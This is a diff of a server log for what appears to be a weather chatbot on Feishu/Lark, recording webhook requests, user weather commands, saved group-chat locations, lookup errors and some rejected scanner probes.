-Weather warning check executed at: 2024-08-09 12:30:00
-Weather warning check executed at: 2024-08-09 13:30:00
-[GIN] 2024/08/09 - 14:10:05 | 404 |         871ns |    198.235.24.9 | GET      "/"
-Weather warning check executed at: 2024-08-09 14:30:00
-[GIN] 2024/08/09 - 14:48:30 | 404 |         671ns | 220.196.160.125 | GET      "/webhook/event"
-Weather warning check executed at: 2024-08-09 15:30:00
-2024/08/09 16:04:26 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/09 16:04:26 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 16:04:26 | 200 |  751.210069ms |   123.58.10.239 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-09 16:30:00
-2024/08/09 16:43:33 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 16:43:33 | 200 |  668.609868ms |   123.58.10.238 | POST     "/webhook/event"
-2024/08/09 16:48:55 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 16:48:56 | 200 |  1.046189446s |   123.58.10.239 | POST     "/webhook/event"
-Weather warning check executed at: 2024-08-09 17:30:00
-[GIN] 2024/08/09 - 17:40:28 | 404 |         651ns |   4.151.230.245 | GET      "/"
-2024/08/09 17:46:02 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 17:46:02 | 200 |  604.500173ms |   123.58.10.238 | POST     "/webhook/event"
-[GIN] 2024/08/09 - 17:51:11 | 404 |       3.157µs |  34.140.185.127 | GET      "/"
-2024/08/09 17:59:58 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 17:59:58 | 200 |  615.337493ms | 220.243.131.173 | POST     "/webhook/event"
-2024/08/09 18:00:05 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 18:00:06 | 200 |  739.909825ms | 220.243.131.173 | POST     "/webhook/event"
-[GIN] 2024/08/09 - 18:11:24 | 404 |       7.003µs |  123.56.106.149 | GET      "/"
-[GIN] 2024/08/09 - 18:11:44 | 404 |         562ns |  123.56.106.149 | GET      "/favicon.ico"
-Weather warning check executed at: 2024-08-09 18:30:00
-[GIN] 2024/08/09 - 18:59:15 | 404 |         551ns | 123.160.221.139 | GET      "/v2/_catalog"
-[GIN] 2024/08/09 - 19:02:20 | 404 |       1.092µs |    36.41.69.114 | GET      "/"
-Weather warning check executed at: 2024-08-09 19:30:00
-[GIN] 2024/08/09 - 19:33:41 | 404 |         561ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/09 - 19:33:41 | 404 |         291ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/09 - 19:33:41 | 404 |         260ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/09 - 19:33:41 | 404 |         301ns |  83.222.190.210 | CONNECT  ""
-[GIN] 2024/08/09 - 19:36:39 | 404 |         741ns |    52.81.237.92 | GET      "/"
-[GIN] 2024/08/09 - 19:36:39 | 404 |         301ns |    52.81.237.92 | GET      "/favicon.ico"
-[GIN] 2024/08/09 - 19:36:39 | 404 |         281ns |    52.81.237.92 | GET      "/sitemap.xml"
-[GIN] 2024/08/09 - 19:36:39 | 404 |         291ns |    52.81.237.92 | GET      "/robots.txt"
-Weather warning check executed at: 2024-08-09 20:30:00
-[GIN] 2024/08/09 - 21:08:23 | 404 |         661ns |  146.70.129.163 | GET      "/NNrN"
-[GIN] 2024/08/09 - 21:08:23 | 404 |         661ns |  146.70.129.163 | GET      "/ll6O"
-[GIN] 2024/08/09 - 21:08:24 | 404 |         561ns |  146.70.129.163 | GET      "/jquery-3.3.1.slim.min.js"
-[GIN] 2024/08/09 - 21:08:24 | 404 |         551ns |  146.70.129.163 | GET      "/jquery-3.3.1.min.js"
-Weather warning check executed at: 2024-08-09 21:30:00
-[GIN] 2024/08/09 - 21:40:07 | 404 |         561ns | 220.196.160.124 | GET      "/webhook/event"
-[GIN] 2024/08/09 - 22:07:30 | 404 |       1.212µs |  220.196.160.84 | GET      "/v2/_catalog"
-Weather warning check executed at: 2024-08-09 22:30:00
-2024/08/09 22:41:11 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
-2024/08/09 22:41:11 [Debug] [req:POST,/open-apis/im/v1/messages/:message_id/reply]
-[GIN] 2024/08/09 - 22:41:12 | 200 |   577.37571ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T15:53:34+08:00" level=info msg="Handling message: {\"name\":\"五福家园\",\"longitude\":\"116.265048\",\"latitude\":\"40.145303\"}"
+time="2024-08-11T15:53:34+08:00" level=info msg="收到位置消息: {\"name\":\"五福家园\",\"longitude\":\"116.265048\",\"latitude\":\"40.145303\"}"
+time="2024-08-11T15:53:34+08:00" level=info msg="消息体: chatID: oc_ee9a94ca81e2fbce54e739144392c266, chatType: group"
+time="2024-08-11T15:53:34+08:00" level=info msg="已保存群聊 oc_ee9a94ca81e2fbce54e739144392c266 的位置: 地区 五福家园 纬度 40.145303, 经度 116.265048"
+2024/08/11 15:53:34 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
+2024/08/11 15:53:34 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:53:35+08:00" level=info msg="Finishing handling message: {\"name\":\"五福家园\",\"longitude\":\"116.265048\",\"latitude\":\"40.145303\"}"
+[GIN] 2024/08/11 - 15:53:35 | 200 |  525.943703ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T15:53:39+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:53:39+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:53:39+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:53:39+08:00" level=info msg="handling now weather"
+2024/08/11 15:53:39 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:53:40+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now\"}"
+[GIN] 2024/08/11 - 15:53:40 | 200 |  522.543559ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:53:42+08:00" level=info msg="Handling message: {\"text\":\"@_user_1\"}"
+time="2024-08-11T15:53:42+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1\"}"
+time="2024-08-11T15:53:42+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:53:42+08:00" level=error msg="invalid command: @_user_1"
+2024/08/11 15:53:42 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:53:43+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1\"}"
+[GIN] 2024/08/11 - 15:53:43 | 200 |  381.367193ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T15:53:47+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T15:53:47+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T15:53:47+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:53:47+08:00" level=info msg="handling rain weather"
+2024/08/11 15:53:47 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:53:48+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain\"}"
+[GIN] 2024/08/11 - 15:53:48 | 200 |  522.961156ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T15:53:55+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/河西\"}"
+time="2024-08-11T15:53:55+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/河西\"}"
+time="2024-08-11T15:53:55+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:53:55+08:00" level=info msg="handling now weather"
+2024/08/11 15:53:55 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:53:56+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/河西\"}"
+[GIN] 2024/08/11 - 15:53:56 | 200 |   532.55281ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:54:11+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain/天津河西\"}"
+time="2024-08-11T15:54:11+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain/天津河西\"}"
+time="2024-08-11T15:54:11+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:54:11+08:00" level=info msg="handling rain weather"
+2024/08/11 15:54:11 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:54:11+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain/天津河西\"}"
+[GIN] 2024/08/11 - 15:54:11 | 200 |  497.233237ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T15:54:21+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/天津河西\"}"
+time="2024-08-11T15:54:21+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/天津河西\"}"
+time="2024-08-11T15:54:21+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:54:21+08:00" level=info msg="handling now weather"
+2024/08/11 15:54:21 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:54:21+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/天津河西\"}"
+[GIN] 2024/08/11 - 15:54:21 | 200 |  508.521128ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:55:00+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain/天津河西\"}"
+time="2024-08-11T15:55:00+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain/天津河西\"}"
+time="2024-08-11T15:55:00+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:55:00+08:00" level=info msg="handling rain weather"
+2024/08/11 15:55:00 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:55:00+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain/天津河西\"}"
+[GIN] 2024/08/11 - 15:55:00 | 200 |   530.43072ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:55:10+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/天津武清\"}"
+time="2024-08-11T15:55:10+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/天津武清\"}"
+time="2024-08-11T15:55:10+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:55:10+08:00" level=info msg="handling now weather"
+2024/08/11 15:55:10 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:55:10+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/天津武清\"}"
+[GIN] 2024/08/11 - 15:55:10 | 200 |  528.477665ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T15:55:48+08:00" level=info msg="Handling message: {\"name\":\"东花园大楼\",\"longitude\":\"117.274310\",\"latitude\":\"39.071281\"}"
+time="2024-08-11T15:55:48+08:00" level=info msg="收到位置消息: {\"name\":\"东花园大楼\",\"longitude\":\"117.274310\",\"latitude\":\"39.071281\"}"
+time="2024-08-11T15:55:48+08:00" level=info msg="消息体: chatID: oc_ee9a94ca81e2fbce54e739144392c266, chatType: group"
+time="2024-08-11T15:55:48+08:00" level=info msg="已保存群聊 oc_ee9a94ca81e2fbce54e739144392c266 的位置: 地区 东花园大楼 纬度 39.071281, 经度 117.274310"
+2024/08/11 15:55:48 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:55:48+08:00" level=info msg="Finishing handling message: {\"name\":\"东花园大楼\",\"longitude\":\"117.274310\",\"latitude\":\"39.071281\"}"
+[GIN] 2024/08/11 - 15:55:48 | 200 |  373.167076ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T15:55:55+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:55:55+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:55:55+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:55:55+08:00" level=info msg="handling now weather"
+2024/08/11 15:55:55 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:55:55+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now\"}"
+[GIN] 2024/08/11 - 15:55:55 | 200 |  476.217594ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T15:56:04+08:00" level=info msg="Handling message: {\"text\":\"@_user_1\"}"
+time="2024-08-11T15:56:04+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1\"}"
+time="2024-08-11T15:56:04+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:56:04+08:00" level=error msg="invalid command: @_user_1"
+2024/08/11 15:56:04 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:56:05+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1\"}"
+[GIN] 2024/08/11 - 15:56:05 | 200 |  393.286607ms |   123.58.10.238 | POST     "/webhook/event"
+2024/08/11 15:56:13 [Error] [handle event,path:/webhook/event,err: unsupported message type]
+[GIN] 2024/08/11 - 15:56:13 | 500 |    4.835842ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T15:56:14+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:56:14+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T15:56:14+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:56:14+08:00" level=info msg="handling now weather"
+2024/08/11 15:56:14 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:56:14+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now\"}"
+[GIN] 2024/08/11 - 15:56:14 | 200 |  483.930484ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T15:56:31+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/榆次\"}"
+time="2024-08-11T15:56:31+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/榆次\"}"
+time="2024-08-11T15:56:31+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:56:31+08:00" level=info msg="handling now weather"
+2024/08/11 15:56:31 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:56:32+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/榆次\"}"
+[GIN] 2024/08/11 - 15:56:32 | 200 |   510.57755ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:57:11+08:00" level=info msg="Handling message: {\"text\":\"[在做了]\"}"
+time="2024-08-11T15:57:11+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"[在做了]\"}"
+time="2024-08-11T15:57:11+08:00" level=info msg="未艾特机器人, 不处理"
+time="2024-08-11T15:57:11+08:00" level=info msg="Finishing handling message: {\"text\":\"[在做了]\"}"
+[GIN] 2024/08/11 - 15:57:11 | 200 |    3.863798ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:57:41+08:00" level=info msg="Handling message: {\"text\":\"及时雨大人好厉害[稍等]\"}"
+time="2024-08-11T15:57:41+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"及时雨大人好厉害[稍等]\"}"
+time="2024-08-11T15:57:41+08:00" level=info msg="未艾特机器人, 不处理"
+time="2024-08-11T15:57:41+08:00" level=info msg="Finishing handling message: {\"text\":\"及时雨大人好厉害[稍等]\"}"
+[GIN] 2024/08/11 - 15:57:41 | 200 |    4.190305ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T15:58:01+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 你好\"}"
+time="2024-08-11T15:58:01+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 你好\"}"
+time="2024-08-11T15:58:01+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T15:58:01+08:00" level=error msg="invalid command: 你好"
+2024/08/11 15:58:01 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T15:58:01+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 你好\"}"
+[GIN] 2024/08/11 - 15:58:01 | 200 |  371.998152ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T16:08:58+08:00" level=info msg="Handling message: {\"name\":\"上海浦东国际机场\",\"longitude\":\"121.808682\",\"latitude\":\"31.142267\"}"
+time="2024-08-11T16:08:58+08:00" level=info msg="收到位置消息: {\"name\":\"上海浦东国际机场\",\"longitude\":\"121.808682\",\"latitude\":\"31.142267\"}"
+time="2024-08-11T16:08:58+08:00" level=info msg="消息体: chatID: oc_8f43329098cfc919213c3c87007f5409, chatType: group"
+time="2024-08-11T16:08:58+08:00" level=info msg="已保存群聊 oc_8f43329098cfc919213c3c87007f5409 的位置: 地区 上海浦东国际机场 纬度 31.142267, 经度 121.808682"
+2024/08/11 16:08:58 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:08:59+08:00" level=info msg="Finishing handling message: {\"name\":\"上海浦东国际机场\",\"longitude\":\"121.808682\",\"latitude\":\"31.142267\"}"
+[GIN] 2024/08/11 - 16:08:59 | 200 |  423.529172ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T16:13:18+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today\"}"
+time="2024-08-11T16:13:18+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today\"}"
+time="2024-08-11T16:13:18+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:13:18+08:00" level=info msg="handling today weather"
+2024/08/11 16:13:18 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:13:18+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today\"}"
+[GIN] 2024/08/11 - 16:13:18 | 200 |  699.976027ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T16:13:48+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /today/苏州\"}"
+time="2024-08-11T16:13:48+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /today/苏州\"}"
+time="2024-08-11T16:13:48+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:13:48+08:00" level=info msg="handling today weather"
+2024/08/11 16:13:48 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:13:49+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /today/苏州\"}"
+[GIN] 2024/08/11 - 16:13:49 | 200 |  691.152754ms |   123.58.10.239 | POST     "/webhook/event"
+[GIN] 2024/08/11 - 16:14:16 | 404 |         742ns |  220.196.160.83 | GET      "/webhook/event"
+time="2024-08-11T16:15:57+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T16:15:57+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now\"}"
+time="2024-08-11T16:15:57+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:15:57+08:00" level=info msg="handling now weather"
+2024/08/11 16:15:57 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:15:57+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now\"}"
+[GIN] 2024/08/11 - 16:15:57 | 200 |  509.608779ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T16:16:20+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/苏州\"}"
+time="2024-08-11T16:16:20+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/苏州\"}"
+time="2024-08-11T16:16:20+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:16:20+08:00" level=info msg="handling now weather"
+2024/08/11 16:16:20 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:16:21+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/苏州\"}"
+[GIN] 2024/08/11 - 16:16:21 | 200 |   525.97338ms | 220.243.131.172 | POST     "/webhook/event"
+time="2024-08-11T16:16:37+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /now/深圳\"}"
+time="2024-08-11T16:16:37+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /now/深圳\"}"
+time="2024-08-11T16:16:37+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:16:37+08:00" level=info msg="handling now weather"
+2024/08/11 16:16:37 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:16:38+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /now/深圳\"}"
+[GIN] 2024/08/11 - 16:16:38 | 200 |  596.981806ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T16:20:50+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /warning\"}"
+time="2024-08-11T16:20:50+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /warning\"}"
+time="2024-08-11T16:20:50+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:20:50+08:00" level=info msg="handling warning weather"
+2024/08/11 16:20:51 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:20:51+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /warning\"}"
+[GIN] 2024/08/11 - 16:20:51 | 200 |  535.557448ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T16:21:25+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /warning/山西\"}"
+time="2024-08-11T16:21:25+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /warning/山西\"}"
+time="2024-08-11T16:21:25+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:21:25+08:00" level=info msg="handling warning weather"
+2024/08/11 16:21:25 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:21:26+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /warning/山西\"}"
+[GIN] 2024/08/11 - 16:21:26 | 200 |  488.715159ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T16:21:32+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /warning/广州\"}"
+time="2024-08-11T16:21:32+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /warning/广州\"}"
+time="2024-08-11T16:21:32+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:21:32+08:00" level=info msg="handling warning weather"
+2024/08/11 16:21:33 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:21:33+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /warning/广州\"}"
+[GIN] 2024/08/11 - 16:21:33 | 200 |  442.394069ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T16:21:39+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /warning/江苏\"}"
+time="2024-08-11T16:21:39+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /warning/江苏\"}"
+time="2024-08-11T16:21:39+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:21:39+08:00" level=info msg="handling warning weather"
+2024/08/11 16:21:39 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:21:39+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /warning/江苏\"}"
+[GIN] 2024/08/11 - 16:21:39 | 200 |   498.91422ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T16:23:27+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /warning/连云港\"}"
+time="2024-08-11T16:23:27+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /warning/连云港\"}"
+time="2024-08-11T16:23:27+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:23:27+08:00" level=info msg="handling warning weather"
+2024/08/11 16:23:27 [Debug] [req:POST,/open-apis/auth/v3/tenant_access_token/internal]
+2024/08/11 16:23:27 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:23:28+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /warning/连云港\"}"
+[GIN] 2024/08/11 - 16:23:28 | 200 |  800.923151ms |   123.58.10.238 | POST     "/webhook/event"
+time="2024-08-11T16:25:58+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:25:58+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:25:58+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:25:58+08:00" level=info msg="handling rain weather"
+2024/08/11 16:25:58 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:25:59+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain\"}"
+[GIN] 2024/08/11 - 16:25:59 | 200 |  546.516996ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T16:26:22+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain/北京海淀\"}"
+time="2024-08-11T16:26:22+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain/北京海淀\"}"
+time="2024-08-11T16:26:22+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:26:22+08:00" level=info msg="handling rain weather"
+2024/08/11 16:26:22 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:26:22+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain/北京海淀\"}"
+[GIN] 2024/08/11 - 16:26:22 | 200 |  639.847736ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T16:40:32+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:40:32+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:40:32+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:40:32+08:00" level=info msg="handling rain weather"
+2024/08/11 16:40:32 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:40:32+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain\"}"
+[GIN] 2024/08/11 - 16:40:32 | 200 |  564.052873ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T16:41:48+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:41:48+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain\"}"
+time="2024-08-11T16:41:48+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:41:48+08:00" level=info msg="handling rain weather"
+2024/08/11 16:41:48 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:41:48+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain\"}"
+[GIN] 2024/08/11 - 16:41:48 | 200 |  491.751915ms | 220.243.131.173 | POST     "/webhook/event"
+time="2024-08-11T16:45:19+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 /rain/today\"}"
+time="2024-08-11T16:45:19+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 /rain/today\"}"
+time="2024-08-11T16:45:19+08:00" level=info msg="QWeatherHandler is handling the message"
+time="2024-08-11T16:45:19+08:00" level=info msg="handling rain weather"
+time="2024-08-11T16:45:19+08:00" level=error msg="CityLookup error: CityLookup request failed with status code: 404, msg: 查询的数据或地区不存在。"
+time="2024-08-11T16:45:19+08:00" level=error msg="getLonLaAndCityName error: CityLookup request failed with status code: 404, msg: 查询的数据或地区不存在。"
+2024/08/11 16:45:19 [Debug] [req:POST,/open-apis/im/v1/messages]
+time="2024-08-11T16:45:20+08:00" level=error msg="handle command error: CityLookup request failed with status code: 404, msg: 查询的数据或地区不存在。"
+time="2024-08-11T16:45:20+08:00" level=info msg="Finishing handling message: {\"text\":\"@_user_1 /rain/today\"}"
+time="2024-08-11T16:45:20+08:00" level=error msg="handling message: {\"text\":\"@_user_1 /rain/today\"} failed: CityLookup request failed with status code: 404, msg: 查询的数据或地区不存在。"
+2024/08/11 16:45:20 [Error] [handle event,path:/webhook/event,err: CityLookup request failed with status code: 404, msg: 查询的数据或地区不存在。]
+[GIN] 2024/08/11 - 16:45:20 | 500 |  437.906416ms |   123.58.10.239 | POST     "/webhook/event"
+2024/08/11 16:56:14 [Error] [handle event,path:/webhook/event,err: unsupported message type]
+[GIN] 2024/08/11 - 16:56:14 | 500 |    4.407023ms |   123.58.10.239 | POST     "/webhook/event"
+time="2024-08-11T18:07:22+08:00" level=info msg="Handling message: {\"text\":\"@_user_1 ...\"}"
+time="2024-08-11T18:07:22+08:00" level=info msg="进入到了消息处理器, 消息内容: {\"text\":\"@_user_1 ...\"}"
+time="2024-08-11T18:07:22+08:00" level=info msg="未艾特机器人, 不处理"
